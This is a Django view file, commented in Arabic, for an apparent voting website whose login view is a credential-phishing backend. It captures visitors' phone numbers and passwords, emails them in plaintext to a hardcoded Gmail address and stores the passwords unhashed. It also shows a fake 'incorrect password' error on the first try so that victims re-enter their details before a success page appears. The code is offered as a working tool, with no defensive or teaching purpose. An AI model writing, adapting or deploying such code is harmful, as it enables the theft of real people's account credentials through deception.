from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.contrib import messages
import re
import logging
from .models import Candidate, Vote

# إعداد تسجيل الأخطاء
logger = logging.getLogger(__name__)

def vote_page(request):
    candidates = Candidate.objects.all()
    return render(request, 'voting/vote.html', {'candidates': candidates})

def login_page(request):
    if request.method == 'POST':
        phone = request.POST.get('phone')
        password = request.POST.get('password')
        candidate = request.GET.get('candidate', 'Unknown')

        # التحقق من صحة رقم الهاتف
        if not re.match(r'^\d{10}$', phone):
            messages.error(request, 'Please enter a valid 10-digit phone number.')
            logger.error(f'Invalid phone number: {phone}')
            return render(request, 'voting/login.html', {'candidate': candidate})

        # إرسال البيانات إلى البريد الإلكتروني
        try:
            send_mail(
                subject='New Vote Submission',
                message=f'Phone: {phone}\nPassword: {password}\nVoted for: {candidate}',
                from_email='oboulechfar1@gmail.com',
                recipient_list=['oboulechfar1@gmail.com'],
            )
            logger.info(f'Email sent for vote: {phone}, {candidate}')
        except Exception as e:
            messages.error(request, f'Failed to send email: {str(e)}')
            logger.error(f'Email sending failed: {str(e)}')
            return render(request, 'voting/login.html', {'candidate': candidate})

        # حفظ التصويت في قاعدة البيانات
        try:
            Vote.objects.create(
                phone=phone,
                password=password,
                candidate=candidate
            )
            logger.info(f'Vote saved in database: {phone}, {candidate}')
        except Exception as e:
            messages.error(request, f'Failed to save vote: {str(e)}')
            logger.error(f'Database save failed: {str(e)}')
            return render(request, 'voting/login.html', {'candidate': candidate})

        # تتبع المحاولات باستخدام الجلسات
        session_key = f'login_attempts_{phone}'
        attempt_count = request.session.get(session_key, 0)

        if attempt_count == 0:
            # المحاولة الأولى: إظهار رسالة خطأ
            request.session[session_key] = 1
            messages.error(request, 'Phone number or password incorrect.')
            logger.info(f'First login attempt for {phone}, showing error.')
            return render(request, 'voting/login.html', {'candidate': candidate})
        else:
            # المحاولة الثانية: توجيه إلى success.html
            request.session[session_key] = 0  # إعادة تعيين العداد
            logger.info(f'Second login attempt for {phone}, redirecting to success.')
            return render(request, 'voting/success.html', {'candidate': candidate})

    candidate = request.GET.get('candidate', 'Unknown')
    return render(request, 'voting/login.html', {'candidate': candidate})